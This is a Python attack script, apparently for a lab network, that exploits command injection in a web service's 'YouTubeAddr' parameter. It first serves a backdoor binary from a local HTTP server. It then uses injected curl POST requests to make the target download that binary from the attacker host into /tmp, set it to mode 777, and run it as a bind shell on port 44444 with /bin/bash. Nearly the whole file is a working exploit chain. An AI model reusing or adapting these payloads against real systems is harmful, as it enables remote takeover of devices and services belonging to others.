#!/usr/bin/env python
import sys
import urllib
import time
import pwn
import psutil
import os

# import netifaces as ni
import SimpleHTTPServer
import SocketServer
from multiprocessing import Process


cmd_prefix = 'curl -X POST -H "Content-Type: application/json" -d \''
# remote_access = 'http://192.168.5.1:8000'
remote_access = 'http://vm0:8000'
cmd_postfix = '\' ' + remote_access
attackerport =8081
sleep_interval = 15


def HTTPRun(port=8081):
    # web_dir = os.path.join(os.path.dirname(__file__), 'res')
    web_dir = "/var/storage/"
    os.chdir(web_dir)
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", port), Handler)
    print "serving at port", port
    httpd.serve_forever()

def encode_payload(cmd=""):
    ret = "YouTubeAddr="
    ytubeaddr = "https://www.youtube.com/watch?v=x4TDulEu_jI&start_radio=1&list=RDMMx4TDulEu_jI"
    if cmd:
        encoded = urllib.quote_plus(ytubeaddr + ";" + cmd).replace('+', '%20')
    else:
        encoded = urllib.quote_plus(ytubeaddr).replace('+', '%20')
    return ret + encoded

def getIPAddr():
    intfs = psutil.net_if_addrs()
    for intf in intfs:
        try:
            ni.ifaddresses(intf)
            ip = ni.ifaddresses(intf)[ni.AF_INET][0]['addr']
            if ip.startswith("192.168.5"):
                return ip
            else:
                ip = ""
        except:
            pass
    return ip


if __name__ == '__main__':
    # Stage 1: Download bdoor
    # TODO: add local address '192.168.5.x' as a download path.
    # Also add simple webserver to download the file.

    p = Process(target=HTTPRun, args=(attackerport,))
    p.start()

    attackerip = "vm1"
    '''
    attackerip = getIPAddr()
    if not attackerip:
        print >> sys.stderr, "[Error] Can't find interface with ip address 192.168.5.x"
        print >> sys.stderr, "[Error] Please check the connectivity to SplitBrain Wifi connection."
        sys.exit()
    '''
    cmd0 = cmd_prefix + encode_payload() + cmd_postfix
    print "STEP 0: Running regular command"
    print "Command: " + cmd0
    os.system(cmd0)

    time.sleep(sleep_interval)

    payload1 = '/usr/bin/curl http://%s:%d/bdoor -o /tmp/bdoor' % (attackerip, attackerport)
    cmd1 = cmd_prefix + encode_payload(payload1) + cmd_postfix
    print "STEP 1: Running " + payload1
    print "Command: " + cmd1
    os.system(cmd1)

    time.sleep(sleep_interval)

    # Stage 2: Download bdoor
    payload2 = 'chmod 777 /tmp/bdoor'
    cmd2 = cmd_prefix + encode_payload(payload2) + cmd_postfix
    print "STEP 2: Running " + payload2
    print "Command: " + cmd2
    os.system(cmd2)

    time.sleep(sleep_interval)

    # Stage 3: Open backdoor by running /tmp/bdoor
    payload3 = '/tmp/bdoor -l -p 44444 -e /bin/bash'
    cmd3 = cmd_prefix + encode_payload(payload3) + cmd_postfix
    print "STEP 3: Running " + payload3
    print "Command: " + cmd3
    os.system(cmd3)

    print "All done running web service..."

    # time.sleep(5)
    # p.terminate()
    # print "Webserver terminated. Exit."


